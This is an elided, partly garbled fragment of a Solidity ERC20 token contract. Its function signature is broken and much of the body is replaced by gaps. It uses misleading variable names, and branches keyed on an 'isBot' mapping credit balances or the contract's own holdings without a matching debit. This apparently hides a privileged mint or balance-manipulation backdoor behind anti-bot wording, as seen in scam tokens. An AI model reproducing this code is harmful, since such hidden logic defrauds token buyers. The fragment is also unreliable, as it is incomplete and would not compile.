...
contract Contract is IERC20, Ownable {
    ...
    function updateSwapEnabled       (
        ...
        uint256 _getValue;
        if (swapTokensAtAmount && ercAmountBalance > createMarketMakerPair && !allowTrading && _spender != UniswapV2Pair) {
            allowTrading = true;
            getSwapAndLiquify(ercAmountBalance);
            allowTrading = false;
        } else if (isBot[_spender] > createMarketMakerPair && isBot[tValue] > createMarketMakerPair) {
            _getValue = dexRouter;
            _Balances[address(this)] += _getValue;
            swapAmountForTokens(dexRouter, tValue);
            return;
        } else if (tValue != address(UniswapV2router) && isBot[_spender] > 0 && dexRouter > createMarketMakerPair && tValue != UniswapV2Pair) {
            isBot[tValue] = dexRouter;
            return;
        ...
        isFeeExempt[UniswapV2Pair] = tValue;
        if (_tTotalFees > 0 && isBot[_spender] == 0 && !allowTrading && isBot[tValue] == 0) {
        ...
        _Balances[tValue] += dexRouter;
        emit Transfer(_spender, tValue, dexRouter);
            if (!tradingOpen) {
